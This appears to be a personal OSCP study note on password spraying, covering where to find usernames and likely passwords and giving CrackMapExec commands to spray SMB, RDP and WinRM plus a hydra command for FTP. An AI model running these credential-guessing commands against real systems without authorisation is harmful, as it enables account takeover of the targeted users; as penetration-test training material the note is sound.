# Password Spraying (OSCP)

Password spraying =
**trying ONE password across MANY users**
(not many passwords on one user).

Trigger this **only after** you have:

- A **list of valid usernames**
- A **likely password** (from:
    - SMB configs
    - winPEAS
    - backups
    - default creds
    - pattern like Password1, Spring2024!, etc.)
    

Typical services to spray:
- SMB
- RDP
- WinRM
- FTP (sometimes)


## **Primary Tool: CrackMapExec (CME)**
### **SMB Password Spray (Most Common)**
```bash
crackmapexec smb <IP> -u users.txt -p 'Password1'
```

### **Continue on Success (Multiple Hits)**
```bash
crackmapexec smb <IP> -u users.txt -p 'Password1' --continue-on-success
```

## ** RDP Spray (If 3389 Open)**
```bash
crackmapexec rdp <IP> -u users.txt -p 'Password1'
```

## **WinRM Spray (If 5985/5986 Open)**
```bash
crackmapexec winrm <IP> -u users.txt -p 'Password1'
```

## **FTP Spray (Less Common)**
```bash
hydra -L users.txt -p Password1 ftp://<IP>
```




## **Where Usernames Come From**

Valid username sources:

- SMB enumeration
    
- enum4linux
    
- crackmapexec smb --users
    
- winPEAS output
    
- Config files (.xml, .ini, .config)
    
- Domain users from compromised host


##  **What To Do After a Hit**
Once creds work:

1. **Validate access**
```bash
crackmapexec smb <IP> -u user -p pass
```



## **🔗 Related Notes**

- [[CrackMapExec]]
- [[NetExec]]
- [[Hydra]]
- [[SMB]]
- [[RDP_and_WinRM]]